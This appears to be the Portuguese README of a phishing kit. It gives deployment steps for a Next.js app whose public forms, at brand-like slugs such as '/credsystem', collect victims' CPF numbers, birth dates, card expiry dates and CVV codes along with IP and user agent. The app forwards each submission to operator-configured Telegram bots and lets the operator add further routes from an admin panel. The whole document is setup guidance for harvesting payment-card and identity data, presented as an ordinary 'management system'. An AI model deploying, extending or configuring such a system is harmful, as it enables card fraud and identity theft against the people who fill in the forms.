# Sistema de Gerenciamento Multi-Rota com Telegram

Sistema completo com isolamento de dados por rota, painel administrativo e integração com Telegram.

## 🚀 Deploy no Railway

### 1. Preparação

Certifique-se de ter uma conta no [Railway](https://railway.app)

### 2. Criar Novo Projeto

1. Acesse [Railway](https://railway.app)
2. Clique em "New Project"
3. Selecione "Deploy from GitHub repo"
4. Conecte seu repositório GitHub (ou faça upload do código)

### 3. Configurar Variáveis de Ambiente

No Railway, vá em **Variables** e adicione:

```env
# Database (Railway cria automaticamente se você adicionar PostgreSQL)
DATABASE_URL=postgresql://...

# Admin Credentials
ADMIN_USERNAME=admin
ADMIN_PASSWORD=SuaSenhaSegura123

# JWT Secret (gere uma chave aleatória forte)
JWT_SECRET=sua-chave-jwt-super-secreta-aqui-min-32-chars

# Node Environment
NODE_ENV=production
```

### 4. Adicionar PostgreSQL

1. No seu projeto Railway, clique em "New"
2. Selecione "Database" → "PostgreSQL"
3. Railway criará automaticamente a variável `DATABASE_URL`

### 5. Deploy Automático

O Railway detectará automaticamente o `package.json` e executará:
- `npm install` (instala dependências)
- `npm run build` (gera Prisma Client, roda migrations e build do Next.js)
- `npm start` (inicia a aplicação)

### 6. Após o Deploy

1. Acesse a URL gerada pelo Railway
2. Execute o seed para criar usuário admin e rotas de exemplo:
   - No Railway, vá em **Settings** → **Deploy Trigger**
   - Ou use o Railway CLI: `railway run npm run db:seed`

## 📋 Configuração Inicial

### Acessar o Painel Admin

1. Acesse: `https://seu-dominio.railway.app/admin`
2. Login padrão:
   - **Usuário**: `admin`
   - **Senha**: (a que você definiu em `ADMIN_PASSWORD`)

### Configurar Rotas

No painel admin:

1. **Criar/Editar Rotas**:
   - Slug: `credsystem` ou `cred-system`
   - Nome: Nome identificador (ex: "CredSystem Principal")
   - Token do Bot: Token do seu bot do Telegram
   - Chat ID: ID do chat/grupo que receberá as mensagens

2. **Como obter Token do Bot**:
   - Fale com [@BotFather](https://t.me/botfather) no Telegram
   - Envie `/newbot`
   - Siga as instruções
   - Copie o token gerado

3. **Como obter Chat ID**:
   - Adicione o bot ao grupo/chat
   - Envie uma mensagem qualquer
   - Acesse: `https://api.telegram.org/bot<SEU_TOKEN>/getUpdates`
   - Procure por `"chat":{"id":-1001234567890}`
   - Copie o ID (incluindo o sinal de menos se houver)

## 🔗 Rotas do Sistema

### Páginas Públicas (Formulários)
- `https://seu-dominio.railway.app/credsystem`
- `https://seu-dominio.railway.app/cred-system`

Cada rota usa a mesma interface, mas envia dados para bots diferentes.

### Painel Administrativo
- `https://seu-dominio.railway.app/admin`

## 🗄️ Estrutura do Banco de Dados

### Tabelas

**RouteConfig**: Configurações de cada rota
- `slug`: Identificador único da rota (ex: "credsystem")
- `name`: Nome amigável
- `telegramToken`: Token do bot
- `telegramChatId`: ID do chat
- `isActive`: Se a rota está ativa

**Submission**: Solicitações enviadas
- `routeSlug`: Rota de origem
- `cpf`, `birthDate`, `cardExpiry`, `cvv`: Dados do formulário
- `sentToTelegram`: Status do envio
- `ipAddress`, `userAgent`: Metadados

**AdminUser**: Usuários do painel admin

## 🔒 Isolamento de Dados

✅ Cada rota tem:
- Seu próprio bot do Telegram
- Seu próprio chat_id
- Suas próprias solicitações
- Configuração independente

❌ Os dados **NUNCA** se misturam:
- Submissions são filtradas por `routeSlug`
- Cada formulário envia apenas para seu bot configurado
- Painel admin permite filtrar por rota

## 🛠️ Comandos Úteis

```bash
# Instalar dependências
npm install

# Desenvolvimento local
npm run dev

# Criar migration
npm run db:migrate

# Aplicar schema ao banco
npm run db:push

# Popular banco com dados iniciais
npm run db:seed

# Abrir Prisma Studio (visualizar dados)
npm run db:studio

# Build para produção
npm run build

# Iniciar produção
npm start
```

## 📦 Estrutura de Arquivos

```
├── app/
│   ├── [slug]/          # Rota dinâmica (formulários)
│   │   └── page.tsx
│   ├── admin/           # Painel administrativo
│   │   └── page.tsx
│   ├── api/             # API Routes
│   │   ├── auth/        # Autenticação
│   │   ├── routes/      # CRUD de rotas
│   │   ├── submissions/ # CRUD de solicitações
│   │   └── validate-route/ # Validação de rotas
│   └── page.tsx         # Página inicial (opcional)
├── lib/
│   ├── prisma.ts        # Cliente Prisma
│   ├── auth.ts          # Autenticação JWT
│   ├── telegram.ts      # Integração Telegram
│   └── utils.ts
├── prisma/
│   ├── schema.prisma    # Schema do banco
│   └── seed.ts          # Dados iniciais
└── .env                 # Variáveis de ambiente
```

## 🔐 Segurança

- Senhas hasheadas com bcrypt
- Autenticação JWT com cookies httpOnly
- Validação de rotas antes de aceitar dados
- Isolamento total entre rotas
- Variáveis sensíveis em `.env`

## 🐛 Troubleshooting

### Erro: "Rota não encontrada"
- Verifique se a rota está cadastrada no admin
- Verifique se está ativa (`isActive: true`)
- Rode `npm run db:seed` para criar rotas de exemplo

### Erro: "Falha ao enviar para Telegram"
- Verifique se o token do bot está correto
- Verifique se o chat_id está correto
- Certifique-se de que o bot foi adicionado ao grupo/chat
- Teste o bot manualmente: `https://api.telegram.org/bot<TOKEN>/getMe`

### Erro de Database no Railway
- Certifique-se de ter adicionado o PostgreSQL
- Verifique se `DATABASE_URL` está configurada
- As migrations rodam automaticamente no build

## 📝 Notas Importantes

1. **Mesmo domínio, rotas diferentes**: O sistema usa rotas dinâmicas (`/credsystem`, `/cred-system`) no mesmo domínio
2. **Dados isolados**: Cada rota é completamente independente
3. **Escalável**: Adicione quantas rotas quiser pelo painel admin
4. **Railway**: Ideal para este projeto, oferece PostgreSQL gratuito e deploy automático

## 🎯 Próximos Passos Após Deploy

1. ✅ Acesse `/admin` e faça login
2. ✅ Configure suas rotas com tokens reais do Telegram
3. ✅ Teste cada rota: `/credsystem` e `/cred-system`
4. ✅ Verifique se as mensagens chegam no Telegram
5. ✅ Monitore as solicitações no painel admin

## 📞 Suporte

Se encontrar problemas:
1. Verifique os logs no Railway (aba "Deployments")
2. Teste as rotas manualmente
3. Verifique as variáveis de ambiente
4. Confirme que o PostgreSQL está conectado
